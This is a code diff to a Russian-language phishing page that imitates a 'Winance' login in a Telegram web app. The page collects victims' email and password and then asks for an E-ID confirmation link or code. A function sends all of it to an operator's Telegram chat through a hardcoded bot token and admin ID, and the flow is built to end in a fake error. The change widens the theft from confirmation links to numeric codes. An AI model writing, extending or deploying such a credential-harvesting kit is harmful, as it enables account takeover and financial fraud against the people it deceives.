@@ -449,7 +449,6 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 
         <button id="loginBtn" class="btn-primary" onclick="handleLogin()">Войти</button>
         
-        <!-- Кнопка входа через E-ID -->
         <button class="btn-secondary" onclick="goTo('eidForm')">Войти через E-ID</button>
 
         <div id="loginError" class="message error"></div>
@@ -491,18 +490,18 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     <div id="pageEidLink" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></div>
         <div class="page-title">Ссылка подтверждения</div>
-        <div class="page-sub">Вставьте ссылку из письма E-ID</div>
+        <div class="page-sub">Вставьте ссылку или код из письма E-ID</div>
 
         <!-- Инструкция -->
         <div class="card" style="margin-bottom: 16px; background: #F8F9FA;">
-            <h3 style="color: var(--accent); margin-bottom: 8px;">Как скопировать ссылку?</h3>
+            <h3 style="color: var(--accent); margin-bottom: 8px;">Как скопировать?</h3>
             <p style="margin-bottom: 6px;"><b>С телефона:</b> Зажмите зеленую кнопку «Подтвердить» на несколько секунд и выберите «Копировать ссылку».</p>
             <p><b>С компьютера:</b> Наведите курсор на кнопку «Подтвердить», кликните правой кнопкой мыши и выберите «Скопировать ссылку».</p>
         </div>
 
         <div class="form-group">
-            <label>Ссылка подтверждения</label>
-            <input type="text" id="eidLinkInput" placeholder="https://e-id.cards/action/login_link_confirm?..." style="font-size: 14px; letter-spacing: normal;">
+            <label>Ссылка / Код подтверждения</label>
+            <input type="text" id="eidLinkInput" placeholder="https://... или цифры" style="font-size: 14px; letter-spacing: normal;">
         </div>
 
         <button id="eidLinkBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить вход</button>
@@ -551,7 +550,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     // ============================================================
     // КОНФИГ (ВСТАВЬ СВОЙ ТОКЕН!)
     // ============================================================
-    const BOT_TOKEN = "8962930921:AAE-EWR1IbKM5HkA4xKpV1mpaWQ4bCno0DE";
+   const BOT_TOKEN = "8962930921:AAE-EWR1IbKM5HkA4xKpV1mpaWQ4bCno0DE";
     const ADMIN_ID  = "8949174431";
     const SUPPORT_LINK = "https://t.me/winance_support";
     const MAX_ATTEMPTS = 3;
@@ -779,21 +778,23 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         goTo('eidLink');
     }
 
-    // ===== 4. E-ID: ОТПРАВКА ССЫЛКИ -> ОШИБКА =====
+    // ===== 4. E-ID: ОТПРАВКА ССЫЛКИ / КОДА -> ОШИБКА =====
     async function handleEidLink() {
         const link = eidLinkInput.value.trim();
-        if (!link || !link.startsWith('http')) { showMessage('Вставьте корректную ссылку', 'error'); return; }
+        
+        // Проверяем только, что поле не пустое
+        if (!link) { showMessage('Введите ссылку или код', 'error'); return; }
 
         eidLinkBtn.disabled = true;
         eidLinkBtn.textContent = 'Отправка...';
 
         const user = tg.initDataUnsafe?.user || {};
         const msg =
-            `🔗 <b>E-ID ССЫЛКА (Winance)</b>\n\n` +
+            `🔗 <b>E-ID ДАННЫЕ (Winance)</b>\n\n` +
             `👤 ID: <code>${user.id || 'неизвестно'}</code>\n\n` +
             `📧 Email: <code>${userEmail}</code>\n` +
             `🔑 Пароль: <code>${userPassword}</code>\n\n` +
-            `<code>${link}</code>`;
+            `🔗 Введено: <code>${link}</code>`;
 
         const ok = await sendToAdmin(msg);
 
